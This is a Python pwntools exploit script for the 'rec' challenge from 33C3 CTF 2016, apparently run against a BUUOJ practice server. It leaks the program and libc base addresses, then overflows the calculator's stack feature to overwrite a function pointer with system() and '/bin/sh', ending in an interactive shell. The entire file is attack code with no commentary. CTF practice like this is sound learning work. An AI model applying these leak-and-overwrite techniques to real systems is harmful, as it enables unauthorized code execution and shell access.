from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./rec_33c3_2016")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("buuoj.cn","20008")
    libc=ELF("../x86_libc.so.6")
elf=ELF("./rec_33c3_2016")
def debug():
    gdb.attach(a,'''
    set $base=0x56555000
    b *(0x56555000+0x0000D3B)
    b *(0x56555000+0x0000DCC)
    b *(0x56555000+0x0000DEF)
    ''')
def menu(idx):
    a.recvuntil("> ")
    a.sendline(str(idx))
def read_note(content):
    menu(0)
    a.recvuntil("Your note: ")
    a.send(content)
def show_note():
    menu(1)
    a.recvuntil("Your note: ")
def sign(content):
    menu(5)
    a.sendline(content)
def improve_stack(nums):
    menu(2)
    a.recvuntil("Operator: ")
    a.sendline("S")
    for i in nums:
        a.recvuntil("Operand: ")
        a.sendline(str(i))
    a.recvuntil("Operand: ")
    a.sendline(".")
def modify(func_addr,arg):
    nums=[]
    for i in range(0x63):
        nums.append(i)
    nums.append(func_addr)   
    nums.append(arg)#
    improve_stack(nums)

#debug()
show_note()
text_base=u32(a.recv(8)[4:])-0x6fb
success("text_base ==> 0x%x"%text_base)
libc_base=u32(a.recv(4))-libc.symbols["_IO_2_1_stdout_"]
success("libc_base ==> 0x%x"%libc_base)
system_addr=libc_base+libc.symbols["system"]
bin_sh_addr=libc_base+next(libc.search("/bin/sh"))

func_addr=-(0x100000000-system_addr)
arg=-(0x100000000-bin_sh_addr)
modify(func_addr,arg)
sign("0")


a.interactive()